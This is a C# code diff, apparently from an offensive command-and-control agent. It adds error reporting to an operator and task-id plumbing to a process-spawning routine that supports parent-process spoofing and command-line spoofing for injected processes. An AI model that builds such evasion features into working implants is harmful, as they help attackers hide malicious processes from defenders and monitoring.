@@ -43,7 +43,7 @@ namespace Agent
             Native.PROCESS_INFORMATION pInfo;
 
             //Spawn Process with or without PPID
-            if (!TryCreateProcess(args, out pInfo, out var hStdOutRead, out var hStdOutWrite))
+            if (!TryCreateProcess(args, job.task.id, out pInfo, out var hStdOutRead, out var hStdOutWrite))
             {
                 await messageManager.AddResponse(new ResponseResult()
                 {
@@ -52,6 +52,7 @@ namespace Agent
                     completed = true,
                     status = "error"
                 });
+                return;
             }
 
             if (!string.IsNullOrEmpty(args.spoofedcommandline))
@@ -164,7 +165,7 @@ namespace Agent
 
             return true;
         }
-        public bool TryCreateProcess(InjectArgs args, out Native.PROCESS_INFORMATION pi, out IntPtr hStdOutRead, out IntPtr hStdOutWrite)
+        public bool TryCreateProcess(InjectArgs args, string task_id, out Native.PROCESS_INFORMATION pi, out IntPtr hStdOutRead, out IntPtr hStdOutWrite)
         {
             //Set Initially
             hStdOutWrite = IntPtr.Zero;
@@ -188,6 +189,7 @@ namespace Agent
             {
                 if (!TryCreateNamedPipe(ref saHandles, out hStdOutRead, out hStdOutWrite))
                 {
+                    messageManager.Write($"[Named Pipe Creation] {Marshal.GetLastPInvokeErrorMessage()}", task_id, true, "error");
                     pi = new Native.PROCESS_INFORMATION();
                     return false;
                 }
@@ -213,7 +215,8 @@ namespace Agent
                     var lpValueProc = IntPtr.Zero;
                     if (!AddSpoofParent(args.parent, args.output, ref sInfoEx, ref lpValue, ref hStdOutWrite, ref dupStdOut))
                     {
-                        pi= new Native.PROCESS_INFORMATION();
+                        messageManager.Write($"[Parent Process] {Marshal.GetLastPInvokeErrorMessage()}", task_id, true, "error");
+                        pi = new Native.PROCESS_INFORMATION();
                         return false;
                     }
                 }
@@ -252,6 +255,11 @@ namespace Agent
                     out pi
                 );
 
+                if (!result)
+                {
+                    messageManager.Write($"[Create Process] {Marshal.GetLastPInvokeErrorMessage()}", task_id, true, "error");
+                }
+
             }
             catch
             {
@@ -270,6 +278,7 @@ namespace Agent
                 Marshal.FreeHGlobal(sInfoEx.lpAttributeList);
             }
             Marshal.FreeHGlobal(lpValue);
+
             return result;
         }
         private bool GetProcessOutput(IntPtr hStdOutRead, Native.PROCESS_INFORMATION pInfo, string task_id)
